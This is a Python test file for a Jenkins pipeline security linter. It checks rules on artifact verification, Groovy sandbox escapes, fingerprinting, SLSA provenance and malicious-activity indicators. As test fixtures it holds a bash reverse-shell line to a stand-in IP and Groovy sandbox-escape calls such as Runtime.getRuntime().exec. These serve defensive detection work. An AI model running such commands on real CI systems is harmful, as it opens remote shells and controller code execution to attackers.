"""Per-rule tests for Jenkins provenance + threat-indicator rules:
JF-013 (copyArtifacts paired with verification),
JF-019 (Groovy sandbox-escape patterns),
JF-027 (archiveArtifacts records fingerprint),
JF-028 (SLSA provenance attestation produced),
JF-029 (Jenkinsfile contains malicious-activity indicators).

JF-013 closes the upstream-pipeline-poisoning gap that copyArtifacts
opens when the producer accepts PR builds. JF-019 catches Groovy
patterns that bypass the script-security sandbox (full controller
RCE). JF-027 / JF-028 cover the build-side provenance surface that
JF-006 (signing) doesn't satisfy on its own. JF-029 is the
threat-indicator catch-all (reverse shells, miners, exfil patterns).
"""
from __future__ import annotations

from .conftest import run_check

# ── JF-013 copyArtifacts verification pairing ───────────────────────


class TestJF013CopyArtifacts:
    def test_fails_when_copyartifacts_has_no_verification(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('consume') {
                    steps {
                        copyArtifacts(projectName: 'upstream-build', selector: lastSuccessful())
                        sh './run-binary.sh'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-013")
        assert not f.passed

    def test_passes_with_sha256_manifest_verify(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('consume') {
                    steps {
                        copyArtifacts(projectName: 'upstream-build', selector: lastSuccessful())
                        sh 'sha256sum -c manifest.sha256'
                        sh './run-binary.sh'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-013")
        assert f.passed

    def test_passes_when_copyartifacts_not_used(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') { steps { sh 'make' } }
            }
        }
        """
        f = run_check(groovy, "JF-013")
        assert f.passed


# ── JF-019 Groovy sandbox-escape patterns ───────────────────────────


class TestJF019SandboxEscape:
    def test_fails_on_runtime_getruntime(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('boom') {
                    steps {
                        script {
                            def proc = Runtime.getRuntime().exec(['/bin/sh','-c','id'] as String[])
                            proc.waitFor()
                        }
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-019")
        assert not f.passed

    def test_fails_on_class_forname(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('boom') {
                    steps {
                        script {
                            def cls = Class.forName('jenkins.model.Jenkins')
                        }
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-019")
        assert not f.passed

    def test_fails_on_grab(self):
        groovy = """
        @Grab(group='org.example', module='thing', version='1.0')
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') { steps { sh 'make' } }
            }
        }
        """
        f = run_check(groovy, "JF-019")
        assert not f.passed

    def test_passes_on_clean_pipeline(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') { steps { sh 'make' } }
            }
        }
        """
        f = run_check(groovy, "JF-019")
        assert f.passed


# ── JF-027 archiveArtifacts fingerprint ─────────────────────────────


class TestJF027ArchiveFingerprint:
    def test_fails_when_archive_omits_fingerprint(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') {
                    steps {
                        sh 'make build'
                        archiveArtifacts artifacts: 'dist/*.tar.gz'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-027")
        assert not f.passed

    def test_passes_with_fingerprint_true(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') {
                    steps {
                        sh 'make build'
                        archiveArtifacts artifacts: 'dist/*.tar.gz', fingerprint: true
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-027")
        assert f.passed

    def test_passes_when_no_archive_artifacts(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('test') { steps { sh 'pytest' } }
            }
        }
        """
        f = run_check(groovy, "JF-027")
        assert f.passed


# ── JF-028 SLSA provenance attestation ──────────────────────────────


class TestJF028SLSAProvenance:
    def test_fails_when_artifact_built_without_provenance(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') {
                    steps {
                        sh 'docker build -t registry.example.com/app:v1 .'
                        sh 'docker push registry.example.com/app:v1'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-028")
        assert not f.passed

    def test_passes_with_cosign_attest(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') {
                    steps {
                        sh 'docker build -t registry.example.com/app:v1 .'
                        sh "cosign attest --predicate=provenance.intoto.jsonl registry.example.com/app:v1"
                        sh 'docker push registry.example.com/app:v1'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-028")
        assert f.passed

    def test_passes_when_no_artifact_produced(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('lint') { steps { sh 'ruff check .' } }
            }
        }
        """
        f = run_check(groovy, "JF-028")
        assert f.passed


# ── JF-029 malicious-activity indicators ────────────────────────────


class TestJF029MaliciousActivity:
    def test_fails_on_reverse_shell_pattern(self):
        # bash -i over /dev/tcp is one of the classic reverse-shell
        # signatures. The catch-all should recognize it.
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('boom') {
                    steps {
                        sh 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'
                    }
                }
            }
        }
        """
        f = run_check(groovy, "JF-029")
        assert not f.passed

    def test_passes_on_clean_pipeline(self):
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                stage('build') { steps { sh 'make' } }
            }
        }
        """
        f = run_check(groovy, "JF-029")
        assert f.passed

    def test_passes_when_pattern_only_in_comment(self):
        # JF-029 strips Groovy comments before scanning, so a TODO
        # mentioning a reverse-shell URL must not trip the check.
        groovy = """
        pipeline {
            agent { label 'linux' }
            options { timeout(time: 30, unit: 'MINUTES') }
            stages {
                // TODO: webhook.site URL goes here for outbound canary
                stage('build') { steps { sh 'make' } }
            }
        }
        """
        f = run_check(groovy, "JF-029")
        assert f.passed
